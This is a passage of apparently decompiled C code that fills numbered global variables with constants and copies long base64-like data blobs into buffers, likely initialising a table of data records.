4bdHkla/uduD62SY1Oe4sfNcUHLpDtHW05OCUj7HyIV1cOr2a", 308);
    *(char *)&g404 = 65;
    g405 = 0;
    g406 = 0x3f074903;
    *(int16_t *)&g407 = 0;
    g408 = g6;
    g409 = 1502;
    memcpy((char *)&g410, (char *)&g43, 375);
    *(int16_t *)&g410 = *(int16_t *)&g43;
    g411 = -0x3f000000;
    g412 = 0x3f8e8bd6;
    *(int16_t *)&g413 = 0;
    g414 = g6;
    g415 = v3;
    memcpy((char *)&g416, "tzfxH4tRAMAPThYmmQ3AWHstZJpPXyp4JycPGMEDTbGswlmCyvX09dx04MAxqeRnQu5Lvq8ubW/zw1+7MwqKgPdKrA6OB0E4KT6+wXaPlZBpl9m6Wtd8cAfCtcrbADQ5PZI2ODtI4Zgfck6KWCqOjsX1mGxi9VoJRTUCLujZBEI3dupfHnWSpHbMEckOF0D1+SdicJl2NpkpaTmNqISSbLKqoiXI1XMPt+2E2JVgSQyxiTG8oP54gX83sNO/CO+ocbkRf12+ShXxq5MWQj7VcZ9nYe1xQP6DuCbm7XWUnsAGtfchnONUZu3zAnzDb99VSLMKdS8Flt5WNXikAFFhrgmQBthVR2pTycrqnaN2drtOIjm9b8U8DdI46voDUaCflCcw0IHPrFT4DNbp80uTo4MhB0M82icievXpYw4CsVa6Uxw4AqVVX3yS6vJSW4rQUKnK4wwYe7LOr3aAFsQRF84XsrlQRpqshzdbZmGrM+RF0fduem93+S3fK2Wu/s/OVr8jnNIbrhlKOCdu2RTNuJdxCSgEJDsNyHjskXPoQiQ9uMUAh6xrPodzLKK1VfWjMaaI2p5Di9aN5jgDWditvv/cjXOnVsSipgViYjdRWyCKW4GhkHyrPEtzxIg1PrPzbpxt4h7uih34duK4VUtqQeyVugNQWcsYY2C4ByfHxGoFMdEfkfrizAqyVRB40i5aHv9NcOjtJcdMMhwCX0NeUNLlTsAeLPpjutVBobANNBFBkIvBK5objeIH/XPKlPoRwUibAYAut951w6xOh3D435cqi1GyHxm3dhkqcSH3PBajZivY9e41JM0eg3Mkv+MuNI2iax0u25YreU/xmJ6urz86cqKDanxu8VrfUxRScc01LVWtUkgqM0cPkq7k6KEwW7ued/BLAuVkbc8L5g5HkS6TStIYpkVM4KMl49iygRM841Xxoas4RZSesIE6Vi4TNYWLYtM/bbZ2O5kH6XwtgeTN7/eYA7tDOHraA9um6YO7MI2WqzViMpy1MdKiBVBsf10KiFSGBxBEBSIUGcwj7NWJmEDvmRl3hAVcJTuYsXnnn7/xxVNKTgST2E0Zebfk9pHHJSv1VQrbAvsLNuMNQq5fzBFW2C7RorfiBgcBSM/8UCOJXmc+qyN2wWfQBuvGZiHYqLPz/UVCNWqtHUHjlzvwiYMbiVzsANsKyTmsd6vamGWytQIOex2IVlczdWcVf7TRTbb69p/s1PkJRoyFWqZfnlXx575TI/QUAwGS2Ncyafj80NRqDxRIXwxlDXYXOmHB3fKqYOdxfJtoICC8Cr7o1AZu0m2mp4FtkLKsmt0Plf1B2euDk9mfuypgt/dsiWA/IXOSiCHZOTpUfMy0+BBTRs2v5+X8U+B/D6IogB5cl1QQ/8iPsTAh7/92sOcLARterrUTJBZKpDS2PYj6wG1VJNcPI+qqJBMSvoWnDnwkyxBX1I/64dEpHuTT9Ui8qG3rRJNqo8SIEiJRq45TaKwqe+3YYXd9XxMNFyVo/IqzSSTBPFrsBPVV4o+Nd7xjH1ecNRIf2fJ3gQAYQh6lQis099aK4nIgLW9ZOkKq17SZ+qPg2E6hSpMlPbCmyYny+TeADbFeVISsOUU2ln4x9ooZOM1e4K65oTdJwD+7/hffFhGwY5c0WbBY1jx42a0ypDNIEIfT+olrHtrEx7cYG4OiC8G+hHgBy2hfJeph1K2jV1bUyWbKAv/hLn0JZFvv3GE7+jxL4ZH3IFgH4nzYopsJUNYB816bjYMbrLB7iTnycV9wMGv9xDRFyK4970/NP2atXeFYdQnW2W6ZD/k4PrxF/h+7s9fDjyb2KxS+lcYIp1AX76nRgl6U8a9z6gqCQjgTyU70SUBliFu/2NYLdOzbWyc3HGnsNOaKGfs0Y6mFU7sjLtIfdgZsV4ODfrFynl0a+nwiSv12XWrCgeKfCsyL7P1lDbC5hq1TQ7DBLberorm9rqvvRv2IkepTh2rTjfQk6Zios9dieq6ZiFemrwRmtvpJd4PcEQ4jccpuOFAjHMGisyHLrqKV9rdP4nzEEO79xX4ROZIpMXNMWxe3k0hYzxb8TwY1IgufxKVqbP4RQIHxWMMVmgzxYXOEhGuXgHttYwGtpyFECliqAulAYEJmy/VVl/AMfkoANrP1MjaHpgP1VCmQTrxW+19f0e1rda6HDDO9HoJzO7dbU/WKfHxV4FGwBp1tFY9WKX18W9pc1rOZqKNZe9dtKQ44Cp7QqUT8L1iuN7o5H7yN5bpIxljrCS/X+F8EHz1QlLPc99XW+iY0umLZK5ABm93iz517JaGI7oviUAmephhhTxpw7ZXIGcEzU2GF2jfoAZFgJyQ23IQkK8Lldhk+quhejzijWue/q2qFvywv34VNQ2uQRSspH9b4QaNlc3QHOSu0ZyWgl+pwn0I5pPo9IM8ywRTUyTNBQZiYQottLq7zy86jrMatDkNtTIpsZQ3lYH4E8Zg40Ny7j77wRVD+/5vCZtVFps+OupEvBMt9Zd5Cd9Ai4R5iZHYxFOcnnkjFZlRaPA9xUlFviGTcg4xvsh/e9CYOzDh66hrV1Njm0mKB1VOnZncnyhvpbYQKRC1HZkEeKnzRzv1J3Nm+MhWDZ5K5RRXs89Zf7rSBh34VOMt23PFErMrUdkRMXM1ymgfqpqmtHqlQl3H5N98o89BZfofLVR/aLqTRW", 365);
    g417 = 0x60000000;
    g418 = 0x3f08eb5e;
    *(int16_t *)&g419 = 0;
    g420 = g6;
    g421 = 1233;
    memcpy((char *)&g422, "4dEpHuTT9Ui8qG3rRJNqo8SIEiJRq45TaKwqe+3YYXd9XxMNFyVo/IqzSSTBPFrsBPVV4o+Nd7xjH1ecNRIf2fJ3gQAYQh6lQis099aK4nIgLW9ZOkKq17SZ+qPg2E6hSpMlPbCmyYny+TeADbFeVISsOUU2ln4x9ooZOM1e4K65oTdJwD+7/hffFhGwY5c0WbBY1jx42a0ypDNIEIfT+olrHtrEx7cYG4OiC8G+hHgBy2hfJeph1K2jV1bUyWbKAv/hLn0JZFvv3GE7+jxL4ZH3IFgH4nzYopsJUNYB816bjYMbrLB7iTnycV9wMGv9xDRFyK4970/NP2atXeFYdQnW2W6ZD/k4PrxF/h+7s9fDjyb2KxS+lcYIp1AX76nRgl6U8a9z6gqCQjgTyU70SUBliFu/2NYLdOzbWyc3HGnsNOaKGfs0Y6mFU7sjLtIfdgZsV4ODfrFynl0a+nwiSv12XWrCgeKfCsyL7P1lDbC5hq1TQ7DBLberorm9rqvvRv2IkepTh2rTjfQk6Zios9dieq6ZiFemrwRmtvpJd4PcEQ4jccpuOFAjHMGisyHLrqKV9rdP4nzEEO79xX4ROZIpMXNMWxe3k0hYzxb8TwY1IgufxKVqbP4RQIHxWMMVmgzxYXOEhGuXgHttYwGtpyFECliqAulAYEJmy/VVl/AMfkoANrP1MjaHpgP1VCmQTrxW+19f0e1rda6HDDO9HoJzO7dbU/WKfHxV4FGwBp1tFY9WKX18W9pc1rOZqKNZe9dtKQ44Cp7QqUT8L1iuN7o5H7yN5bpIxljrCS/X+F8EHz1QlLPc99XW+iY0umLZK5ABm93iz517JaGI7oviUAmephhhTxpw7ZXIGcEzU2GF2jfoAZFgJyQ23IQkK8Lldhk+quhejzijWue/q2qFvywv34VNQ2uQRSspH9b4QaNlc3QHOSu0ZyWgl+pwn0I5pPo9IM8ywRTUyTNBQZiYQottLq7zy86jrMatDkNtTIpsZQ3lYH4E8Zg40Ny7j77wRVD+/5vCZtVFps+OupEvBMt9Zd5Cd9Ai4R5iZHYxFOcnnkjFZlRaPA9xUlFviGTcg4xvsh/e9CYOzDh66hrV1Njm0mKB1VOnZncnyhvpbYQKRC1HZkEeKnzRzv1J3Nm+MhWDZ5K5RRXs89Zf7rSBh34VOMt23PFErMrUdkRMXM1ymgfqpqmtHqlQl3H5N98o89BZfofLVR/aLqTRW", 308);
    *(char *)&g422 = 52;
    g423 = 0x10000000;
    g424 = 0x3f14184c;
    *(int16_t *)&g425 = 0;
    g426 = g6;
    g427 = 1502;
    memcpy((char *)&g428, (char *)&g44, 375);
    *(int16_t *)&g428 = *(int16_t *)&g44;
    g429 = 0x60000000;
    g430 = 0x3f023dd6;
    *(int16_t *)&g431 = 0;
    g432 = g6;
    g433 = v3;
    memcpy((char *)&g434, "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", 365);
    g435 = 0x60000000;
    g436 = 0x3f4a9e08;
    *(int16_t *)&g437 = 0;
    g438 = g6;
    g439 = 1233;
    memcpy((char *)&g440, "JNNVBVLf2sT5fexUEH4+yJ+acD0o/tlL8NWFGVMAb8sEL9jJT1RtR0c6XgIlZXQrjrT1/VRo3CwmsEH177rOqwtf3UEtlTvsMKGArsdjxV2WMC8pdE3gp/5F8p/9dZtTSYHv86T0s67e1D9h8bM9UeXBvvK0InkVHNc+QBCLSQQ8WZKPi65JrOAw6RYSbVuYmd4edzOz+MM3s9ihiP+v2Ia/qb8wnVsSaqc7dJr1/LHf58l55jopke6HbVf8+AXDS4cyYU3KufxpRBJ+RDNH2SfHgDe5nsLya0cTbE9TW17G0rjzidLF+1SKxtvyoygytWD+OFEzdREaKGI+ChFwrnNQxwLmoEqd4z08bluAYxkWTwPelzwPMnTHkDmpwbP+nJyrtAjELCaF3HOZcSnjo0ElSnQqk2yEEVmg4IOUAmcWv91SGReAcyACoZADCeT+mZjZhABDtNN7fMP7M8dgG3sTlQkLucLI3B7V2utiRsCOPfyrr6/xUNX7d+eToFoQcmrsfv/znK9q1B5EHCV9A7SaZZhT4p6lYRfnPg1kZ8TGZ5YNl51yfRJ61Rwgnc38RP4HkFhdvdCoeqQM0Kw2qj/DimszVvNsbOvXA/4D5nDfhhUX4d6WVFXtthZzswTVTJTCqWGTBaCRaeJDg1oTw5WcnbMdnSFxH6O6JpVxcN/FxvKXQoxIpoBFqcm/xl4fYkpUvqY9rq/92UORbBCPT3CCbWhOP3gJNl1GH8oSuHG7m2bygsKB67Hqk8JKuGzdpGygu00Q/Ytbttzk8rBIdBFi6Tj9GNf4KCdOsOFkl1IiF4mb7bjOLofP5/dBz85pDAIn5VuMi3JB5DcjnBoMITtM7sVuzeT8/uVzDtL+yzz/OqiO4bl9H+BGcrGG5jnlqLgI1dh1thymLio0OwifPa9oIXKscPKcgLGp9kxJ+w89y5JNC3fMvFTAwBmsmMZ1tiwRGNCwRCqI9G/aTX5sjOncf4Z5sobirIT26Cxovw88M/EcTA3cPoHbzwvMa94Bv0O+MCp4e+Nz9c4hcLSLxcj4yVDHO+on/Yx4rhnglhrZNsZQxIKC0BmUd8WQ8tL/8aNRqHuKEcgvcIRwFKrvGE8DjAvrxvUGxt/B9X6TQ+pRpD0ENlpV2yVqFqeJvInYgOguNQs9XTlteOjTLZX5tU97X/JoaVMN8zwAkgTjpIAKN4NQoXD670XEgTNsF7GswgsMIfDXDvTudKaon", 308);
    *(char *)&g440 = 74;
    g441 = -0x20000000;
    g442 = 0x3f11b578;
    *(int16_t *)&g443 = 0;
    g444 = g6;
    g445 = 95;
    memcpy((char *)&g446, (char *)&g45, 23);
    *(int16_t *)&g446 = *(int16_t *)&g45;
    int32_t v4 = 2; // ecx
    char v5 = *(char *)((int32_t)&g45 + 2); // 0x402a18
    *(char *)((int32_t)&g446 + 2) = v5;
    *(int16_t *)&g453 = (int16_t)v4;
    g454 = v4;
    g458 = v4;
    g447 = 0x17d90000;
    g448 = 0x3ffb00f8;
    *(int16_t *)&g449 = (int16_t)g6;
    g450 = g6;
    g451 = -0x4eb60000;
    g452 = 0x3fce463e;
    g455 = -0x16500000;
    g456 = 0x3fa133cc;
    *(int16_t *)&g457 = 0;
    g459 = v1;
    memcpy((char *)&g460, (char *)&g46, 34);
    *(char *)&g460 = *(char *)&g46;
    g464 = 2;
    g468 = 2;
    g461 = 0x38000000;
    g462 = 0x3f200e51;
    *(int16_t *)&g463 = (int16_t)g6;
    g465 = -0xc000000;
    g466 = 0x3f885d29;
    *(int16_t *)&g467 = 0;
    g469 = 85;
    memcpy((char *)&g470, (char *)&g47, 16);
    *(char *)&g470 = *(char *)&g47;
    g478 = 3;
    g486 = 3;
    g471 = -0x1a600000;
    g472 = 0x3f871f0f;
    *(int16_t *)&g473 = (int16_t)g6;
    g474 = 2;
    g475 = -0x43200000;
    g476 = 0x3f848af5;
    *(int16_t *)&g477 = 2;
    g479 = 0x40600000;
    g480 = 0x3fa3f871;
    *(int16_t *)&g481 = 2;
    g482 = 4;
    g483 = -0x4d000000;
    g484 = 0x3f86f077;
    *(int16_t *)&g485 = 0;
    g487 = 132;
    g488 = 0;
    g489 = -2;
    g490 = -0x10000000;
    g491 = 0x3f2534bc;
    *(int16_t *)&g492 = 2;
    g493 = 5;
    g494 = -0x10c00000;
    g495 = 0x3f842ca8;
    *(int16_t *)&g496 = 0;
    g497 = 4;
    g498 = 132;
    g499 = 0;
    g500 = -2;
    g501 = -0x80000000;
    g502 = 0x3f057d2e;
    *(int16_t *)&g503 = 0;
    g504 = 5;
    g505 = 132;
    g506 = 0;
    g507 = -2;
    g508 = -0x20000000;
    g509 = 0x3f0c2a71;
    *(int16_t *)&g510 = 2;
    g511 = 6;
    g512 = -0x4bf00000;
    g513 = 0x3f9040fe;
    *(int16_t *)&g514 = 0;
    g515 = 6;
    g516 = 132;
    g517 = 0;
    g518 = -2;
    g519 = -0x10000000;
    g520 = 0x3f1178ab;
    *(int16_t *)&g521 = 2;
    g522 = 7;
    g523 = -0x68300000;
    g524 = 0x3f952b9b;
    *(int16_t *)&g525 = 2;
    g526 = 8;
    g527 = -0x53400000;
    g528 = 0x3f875036;
    *(int16_t *)&g529 = 0;
    g530 = 7;
    g531 = 132;
    g532 = 0;
    g533 = -2;
    g534 = -0x30000000;
    g535 = 0x3f1eb758;
    *(int16_t *)&g536 = 0;
    g537 = 8;
    g538 = 132;
    *(int16_t *)&g543 = 2;
    *(int16_t *)&g547 = 2;
    *(int16_t *)&g565 = 2;
    *(int16_t *)&g569 = 2;
    *(int16_t *)&g580 = 2;
    *(int16_t *)&g591 = 2;
    *(int16_t *)&g602 = 2;
    *(int16_t *)&g613 = 2;
    g539 = 0;
    g540 = -2;
    g541 = -0x78000000;
    g542 = 0x3f22834b;
    g544 = 9;
    g545 = -0x2ef00000;
    g546 = 0x3f90e531;
    g548 = 10;
    g549 = -0x3b400000;
    g550 = 0x3f8628e2;
    *(int16_t *)&g551 = 0;
    g552 = 9;
    g553 = 132;
    g554 = 0;
    g555 = -2;
    g556 = -0x20000000;
    g557 = 0x3f1f1e5b;
    *(int16_t *)&g558 = 0;
    g559 = 10;
    g560 = 132;
    g561 = 0;
    g562 = -2;
    g563 = 0;
    g564 = 0x3f2343cc;
    g566 = 11;
    g567 = 0x31000000;
    g568 = 0x3f90f9c5;
    g570 = 12;
    g571 = 0x21a00000;
    g572 = 0x3f91b41e;
    *(int16_t *)&g573 = 0;
    g574 = 11;
    g575 = 132;
    g576 = 0;
    g577 = -2;
    g578 = 0x68000000;
    g579 = 0x3f20ec61;
    g581 = 13;
    g582 = 0x61e00000;
    g583 = 0x3f893ce9;
    *(int16_t *)&g584 = 0;
    g585 = 12;
    g586 = 132;
    g587 = 0;
    g588 = -2;
    g589 = 0x30000000;
    g590 = 0x3f225872;
    g592 = 14;
    g593 = 0x32000000;
    g594 = 0x3f8fa06f;
    *(int16_t *)&g595 = 0;
    g596 = 13;
    g597 = 132;
    g598 = 0;
    g599 = -2;
    g600 = 0x38000000;
    g601 = 0x3f22e3a1;
    g603 = 15;
    g604 = 0x2e200000;
    g605 = 0x3f8464a6;
    *(int16_t *)&g606 = 0;
    g607 = 14;
    g608 = 132;
    g609 = 0;
    g610 = -2;
    g611 = -0x68000000;
    g612 = 0x3f21e90b;
    g614 = 16;
    g616 = -0x3300000;
    g617 = 0x3f940e6a;
    *(int16_t *)&g618 = 0;
    g619 = 15;
    g621 = 0;
    g622 = -2;
    g626 = 16;
    g620 = 132;
    g623 = 0x70000000;
    g624 = 0x3f2005a0;
    *(int16_t *)&g625 = 0;
    g627 = v1;
    memcpy((char *)&g628, (char *)&g48, 34);
    *(char *)&g628 = *(char *)&g48;
    g632 = 16;
    g637 = 16;
    g629 = 0x68000000;
    g630 = 0x3f24e127;
    *(int16_t *)&g631 = (int16_t)g6;
    g634 = 0x20000000;
    g635 = 0x3f842d86;
    *(int16_t *)&g636 = 0;
    g638 = 85;
    memcpy((char *)&g639, (char *)&g49, 21);
    *(char *)&g639 = *(char *)&g49;
    g651 = 17;
    g655 = 17;
    g647 = 2;
    *(int16_t *)&g650 = 2;
    *(int16_t *)&g661 = 2;
    *(int16_t *)&g665 = 2;
    *(int16_t *)&g676 = 2;
    *(int16_t *)&g687 = 2;
    g640 = -0x28000000;
    g641 = 0x3f84c53c;
    *(int16_t *)&g642 = (int16_t)g6;
    g643 = 16;
    g644 = -0x2a600000;
    g645 = 0x3f847db2;
    *(int16_t *)&g646 = 3;
    g648 = -0x30000000;
    g649 = 0x3f8e6130;
    g652 = 0x7a00000;
    g653 = 0x3f979388;
    *(int16_t *)&g654 = 0;
    g656 = 132;
    g657 = 0;
    g658 = -2;
    g659 = -0x40000000;
    g660 = 0x3f0f69a7;
    g662 = 18;
    g663 = 0x6c100000;
    g664 = 0x3f936fb8;
    g666 = 19;
    g667 = -0x7200000;
    g668 = 0x3f86e82b;
    *(int16_t *)&g669 = 0;
    g670 = 18;
    g671 = 132;
    g672 = 0;
    g673 = -2;
    g674 = 0x20000000;
    g675 = 0x3f0a7d7c;
    g677 = 20;
    g678 = 0x6f900000;
    g679 = 0x3f90710d;
    *(int16_t *)&g680 = 0;
    g681 = 19;
    g682 = 132;
    g683 = 0;
    g684 = -2;
    g685 = -0x40000000;
    g686 = 0x3f10f488;
    g688 = 21;
    g694 = 0;
    g695 = -2;
    g699 = 21;
    g701 = 0;
    g702 = -2;
    g689 = -0x29600000;
    g690 = 0x3f88091c;
    *(int16_t *)&g691 = 0;
    g692 = 20;
    g693 = 132;
    g696 = 0x40000000;
    g697 = 0x3f152262;
    *(int16_t *)&g698 = 0;
    g700 = 132;
    g703 = -0x58000000;
    g704 = 0x3f21498f;
    *(int16_t *)&g705 = 3;
    g706 = 16;
    g707 = -0x64dd0000;
    g708 = 0x3fef7d50;
    *(int16_t *)&g709 = 0;
    g710 = g6;
    g711 = 95;
    memcpy((char *)&g712, (char *)&g50, 23);
    *(int16_t *)&g712 = *(int16_t *)&g50;
    char v6 = *(char *)((int32_t)&g50 + 2); // 0x403362
    *(char *)((int32_t)&g712 + 2) = v6;
    g713 = -0x80000000;
    g714 = 0x3f235c0e;
    *(int16_t *)&g715 = (int16_t)g6;
    g716 = g6;
    g717 = -0x23e00000;
    g718 = 0x3f87c770;
    *(int16_t *)&g719 = 0;
    g720 = g6;
    g721 = 1502;
    memcpy((char *)&g722, (char *)&g51, 375);
    *(int16_t *)&g722 = *(int16_t *)&g51;
    g723 = -0x51c00000;
    g724 = 0x3f8aa2ad;
    *(int16_t *)&g725 = 0;
    g726 = g6;
    g727 = v3;
    memcpy((char *)&g728, (char *)&g52, 365);
    g729 = 0x10000000;
    g730 = 0x3f3b3cc3;
    *(int16_t *)&g731 = 0;
    g732 = g6;
    g733 = 1233;
    memcpy((char *)&g734, (char *)&g53, 308);
    *(char *)&g734 = *(char *)&g53;
    g735 = 0x70000000;
    g736 = 0x3f18212b;
    *(int16_t *)&g737 = (int16_t)g6;
    g738 = g6;
    g739 = -0x3a400000;
    g740 = 0x3f95423d;
    *(int16_t *)&g741 = 0;
    g742 = 3;
    g743 = v3;
    memcpy((char *)&g744, (char *)&g54, 365);
    g745 = 0x56000000;
    g746 = 0x3f868688;
    *(int16_t *)&g747 = 0;
    g748 = 3;
    g749 = v3;
    memcpy((char *)&g750, (char *)&g55, 365);
    g751 = 0x60000000;
    g752 = 0x3f14b3fd;
    *(int16_t *)&g753 = 0;
    g754 = 4;
    g755 = v3;
    memcpy((char *)&g756, (char *)&g54, 365);
    g757 = -0x2a000000;
    g758 = 0x3f77aeb9;
    *(int16_t *)&g759 = 0;
    g760 = 4;
    g761 = v3;
    memcpy((char *)&g762, (char *)&g55, 365);
    g763 = -0x40000000;
    g764 = 0x3f18800f;
    *(int16_t *)&g765 = 0;
    g766 = 5;
    g767 = 1500;
    memcpy((char *)&g768, (char *)&g56, 375);
    g769 = -0x60000000;
    g770 = 0x3f0a73f4;
    *(int16_t *)&g771 = 0;
    g772 = 5;
    g773 = 1420;
    memcpy((char *)&g774, (char *)&g57, 355);
    g775 = 0x40000000;
    g776 = 0x3f090b0b;
    *(int16_t *)&g777 = 0;
    g778 = 6;
    g779 = 1500;
    memcpy((char *)&g780, (char *)&g56, 375);
    g781 = 0x59800000;
    g782 = 0x3f6b9cbb;
    *(int16_t *)&g783 = 0;
    g784 = 6;
    g785 = 1420;
    memcpy((char *)&g786, (char *)&g58, 355);
    g787 = 0x18000000;
    g788 = 0x3f2a8f00;
    *(int16_t *)&g789 = 0;
    g790 = 7;
    g791 = v3;
    memcpy((char *)&g792, (char *)&g54, 365);
    g793 = -0x80000000;
    g794 = 0x3f151213;
    *(int16_t *)&g795 = 0;
    g796 = 7;
    g797 = v3;
    memcpy((char *)&g798, (char *)&g55, 365);
    g799 = -0x6c000000;
    g800 = 0x3f392055;
    *(int16_t *)&g801 = 0;
    g802 = 8;
    g803 = 1500;
    int32_t v7 = -63;
    memcpy((char *)&g804, (char *)&g56, 375);
    g805 = -0x58000000;
    g806 = 0x3f24b1ac;
    *(int16_t *)&g807 = 0;
    g808 = 8;
    v1 = 1420;
    g809 = 1420;
    memcpy((char *)&g810, (char *)&v7, 355);
    g811 = -0x20000000;
    g812 = 0x3f3290d9;
    *(int16_t *)&g813 = 0;
    g814 = 9;
    g815 = v3;
    memcpy((char *)&g816, (char *)&g54, 365);
    g817 = -0x48000000;
    g818 = 0x3f3d8441;
    *(int16_t *)&g819 = 0;
    g820 = 9;
    g821 = v3;
    memcpy((char *)&g822, (char *)&g55, 365);
    g823 = -0x35000000;
    g824 = 0x3f700c16;
    *(int16_t *)&g825 = 0;
    g826 = 10;
    g827 = v3;
    memcpy((char *)&g828, (char *)&g54, 365);
    g829 = -0x70000000;
    g830 = 0x3f218687;
    *(int16_t *)&g831 = 0;
    g832 = 10;
    g833 = v3;
    memcpy((char *)&g834, (char *)&g55, 365);
    g835 = 0x50000000;
    g836 = 0x3f3d2cfb;
    *(int16_t *)&g837 = 0;
    g838 = 11;
    g839 = 1500;
    memcpy((char *)&g840, (char *)&g56, 375);
    g841 = 0x20000000;
    g842 = 0x3f19a8d1;
    *(int16_t *)&g843 = 0;
    g844 = 11;
    g845 = v1;
    memcpy((char *)&g846, (char *)&v7, 355);
    g847 = 0x10000000;
    g848 = 0x3f16650b;
    *(int16_t *)&g849 = 0;
    g850 = 12;
    g851 = v3;
    memcpy((char *)&g852, (char *)&g54, 365);
    g853 = 0x4000000;
    g854 = 0x3f39f7df;
    *(int16_t *)&g855 = 0;
    g856 = 12;
    g857 = v3;
    memcpy((char *)&g858, (char *)&g55, 365);
    g859 = -0x70000000;
    g860 = 0x3f196c26;
    *(int16_t *)&g861 = 0;
    g862 = 13;
    g863 = v3;
    memcpy((char *)&g864, (char *)&g54, 365);
    g865 = 0x2f000000;
    g866 = 0x3f512473;
    *(int16_t *)&g867 = 0;
    g868 = 13;
    g869 = v3;
    memcpy((char *)&g870, (char *)&g55, 365);
    g871 = -0x3e800000;
    g872 = 0x3f6e86bd;
    *(int16_t *)&g873 = 0;
    g874 = 14;
    g875 = v3;
    memcpy((char *)&g876, (char *)&g54, 365);
    g877 = -0x78000000;
    g878 = 0x3f21b499;
    *(int16_t *)&g879 = 0;
    g880 = 14;
    g881 = v3;
    memcpy((char *)&g882, (char *)&g55, 365);
    g883 = 0x10000000;
    g884 = 0x3f3ad20f;
    *(int16_t *)&g885 = 0;
    g886 = 15;
    g887 = v3;
    memcpy((char *)&g888, (char *)&g54, 365);
    g889 = 0x68000000;
    g890 = 0x3f3a8f4d;
    *(int16_t *)&g891 = 0;
    g892 = 15;
    g893 = v3;
    memcpy((char *)&g894, (char *)&g55, 365);
    g895 = 0x20000000;
    g896 = 0x3f147956;
    *(int16_t *)&g897 = 0;
    g898 = 17;
    g899 = 1500;
    memcpy((char *)&g900, (char *)&g56, 375);
    g901 = -0x20000000;
    g902 = 0x3f0dd89c;
    *(int16_t *)&g903 = 0;
    g904 = 17;
    g905 = v1;
